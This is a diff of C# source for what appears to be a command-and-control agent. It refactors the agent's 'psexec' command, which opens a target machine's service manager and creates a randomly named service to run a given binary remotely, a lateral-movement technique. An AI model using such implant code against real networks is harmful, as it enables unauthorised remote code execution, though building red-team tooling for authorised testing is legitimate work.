@@ -10,19 +10,33 @@ using System.Threading.Tasks;
 using Agent.Models;
 using WinAPI.DInvoke;
 using WinAPI.Data.AdvApi;
+using Shared;
 
 namespace Agent.Commands.Execution
 {
     internal class PsExecCommand : AgentCommand
     {
-        public override string Name => "psexec";
-        public override void InnerExecute(AgentTask task, AgentCommandContext context)
+        public override CommandId Command => CommandId.PsExec;
+        public override async Task InnerExecute(AgentTask task, AgentCommandContext context, CancellationToken token)
         {
-            var target = task.SplittedArgs[0];
-            var binpath = task.SplittedArgs[1];
+
+            task.ThrowIfParameterMissing(ParameterId.Path);
+            task.ThrowIfParameterMissing(ParameterId.Target);
+
+            string binpath = task.GetParameter<string>(ParameterId.Path);
+            string target = task.GetParameter<string>(ParameterId.Target);
+
             context.AppendResult($"target : {target}");
             context.AppendResult($"binpath : {binpath}");
 
+
+            var serviceName = ShortGuid.NewGuid();
+            var displayName = ShortGuid.NewGuid();
+            if (task.HasParameter(ParameterId.Service))
+                serviceName = task.GetParameter<string>(ParameterId.Service);
+
+            if (task.HasParameter(ParameterId.Name))
+                displayName = task.GetParameter<string>(ParameterId.Name);
 
             // open handle to scm
             var scmHandle = Advapi.OpenSCManager(
@@ -32,9 +46,7 @@ namespace Agent.Commands.Execution
             if (scmHandle == IntPtr.Zero)
                 throw new Win32Exception(Marshal.GetLastWin32Error());
 
-            var serviceName = ShortGuid.NewGuid();
-
-            var displayName = ShortGuid.NewGuid();
+           
 
             // create service
             var svcHandle = Advapi.CreateService(
